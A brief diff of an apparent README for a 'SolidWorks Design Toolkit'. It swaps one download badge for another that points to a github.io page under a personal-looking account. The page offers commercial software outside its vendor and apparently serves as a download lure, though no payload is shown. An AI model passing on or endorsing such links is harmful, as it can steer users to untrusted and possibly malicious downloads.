@@ -4,10 +4,8 @@
   <img src="https://1000logos.net/wp-content/uploads/2020/08/SolidWorks-Logo.jpg" alt="SolidWorks Design Toolkit Logo"/>
 </div>
 
-<div align="center">
+[![GET SolidWorks Design](https://img.shields.io/badge/GET%20%E2%80%94%20SolidWorks-Design-0078D6?style=for-the-badge&logoColor=white)](https://mariacampbellx514.github.io/.github/SolidWorks-Design)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://solidworks-design-tools.github.io/.github/)
-</div>
 
 ---
 
